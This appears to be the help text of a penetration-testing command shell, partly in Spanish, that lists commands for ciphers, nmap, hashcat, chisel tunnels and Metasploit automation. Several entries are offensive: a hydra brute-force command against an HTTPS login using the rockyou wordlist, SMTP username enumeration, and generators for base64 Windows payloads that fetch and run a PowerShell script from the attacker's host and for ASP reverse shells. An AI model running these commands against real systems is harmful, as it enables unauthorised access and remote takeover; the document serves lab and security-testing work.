Encodes a string with the given shift value and substitution key

## decode
Decodes a string with the given shift value and substitution key

## rot
Apply ROT13 substitution cipher to the given string.

Usage:
    rot <number> '<string>'

## hydra
hydra -f -L sessions/users.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.9 -s 5000 https-get /v2/

## smtpuserenum
sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10

## sshd
sudo systemctl start ssh

## nmapscripthelp
help to know nmap scripts: nmap --script-help 'snmp*'

## apropos
Search for commands matching the given parameter in the cmd interface and optionally extend the search using the system's `apropos` command.

:param line: The search term to find matching commands.

:returns: None

Manual execution:
To manually search for commands matching a term using the `apropos` command, use the following command:

    apropos <search_term>

Example:
    apropos network

The `apropos` command will search for commands and documentation that match the given search term.

The function also searches within the available commands in the cmd interface.

## searchhash
help to know search hashcat hash types: hashcat -h | grep -i <ARGUMENT>

## clean
delete all from sessions

## pyautomate
pyautomate automatization of tools to pwn a target all rights https://github.com/honze-net/pwntomate

## alias
Imprime todos los alias configurados.

## tcpdump_icmp
se pone en escucha con la interfaz señalada por argumento ej: tcpdump_icmp tun0

## winbase64payload
Crea un payload encodeado en base64 especial para windows para ejecutar un ps1 desde lhost

## revwin
Crea un payload encodeado en base64 especial para windows para ejecutar un ps1 desde lhost

## asprevbase64
create a base64 rev shell in asp, you need pass the base64 encodd payload, see help winbase64payload to create the payload base64 encoded

## rubeus
copia a la clipboard la borma de descargar Rubeus

## socat
run socat in ip:port seted by argument config the port 1080 in /etc/proxychains.conf

## chisel
run download_resources command to download and run chisel :D like ./chisel_linux_amd64 server -p 3333 --reverse -v

## msf
automate msfconsole scan or rev shell

## encrypt
Encrypt a file using XOR. Usage: encrypt <file_path> <key>

## decrypt
Decrypt a file using XOR. Usage: decrypt <file_path> <key>

## get_output
Devuelve la salida acumulada

